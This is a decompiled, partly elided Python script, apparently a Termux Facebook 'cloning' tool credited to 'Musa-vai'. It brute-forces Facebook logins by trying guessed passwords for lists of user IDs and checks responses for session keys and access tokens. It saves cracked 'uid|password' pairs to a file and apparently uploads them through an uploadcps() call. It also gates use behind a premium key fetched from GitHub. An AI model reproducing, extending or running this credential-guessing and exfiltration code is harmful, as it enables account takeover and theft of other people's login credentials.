# Decompile by Mardis (Tools By Musa-vai)
...
def helpnote():
    ...
    subprocess.check_output(['am', 'start', 'https://www.facebook.com/AUTO.FOLLOWER.UNLIMITED.SELL.1'])
    exit(' [*] FACEBOOK :  https://www.facebook.com/AUTO.FOLLOWER.UNLIMITED.SELL.1')


def notice():
    runtxt('\n\x1b[0;91m YOU ARE NOT PREMIUM USER ')
    runtxt('\x1b[0;93m SEND THIS KEY TO ADMIN >> %s%s' % (G, basesplit))
    runtxt('\x1b[0;92m ADMIN FACEBOOK >> X Musa Vau')
    subprocess.check_output(['am', 'start', 'https://www.facebook.com/MR.MuSa.ToDeR.ReAl.PapPA'])
...
class Main():
    ...
    def __init__(self):
        ...
        self.loop = 0
        try:
            plr = requests.get('https://github.com/MUSALOVESYMON/file/blob/main/approved.txt').text
            if basesplit in plr:
                key = basesplit
    ...
    def email(self):
        x = 111
        xx = 999
        nam = input('%s [?] TYPE A NAME %s(EX:MUSA ): ' % (Y, G))
        nam = nam.replace(' ', '')
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r\r %s\x1b[0;93m[👉][==KT==Musa]:\x1b[0;97m %s/%s ->\x1b[0;92m[K4US4R-OK:%s]-\x1b[0;93m[K4US4R-CP:%s]' % (B, self.loop, len(self.id), len(self.ok), len(self.cp)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                print '\r \x1b[0;93m[MUSA-CP] %s|%s\x1b[0;97m         ' % (uid, pw)
                self.cp.append('%s|%s' % (uid, pw))
                open('cp.txt', 'a').write(' [MUSA-CP] %s|%s\n' % (uid, pw))
                uploadcps()
                break
            else:
                continue
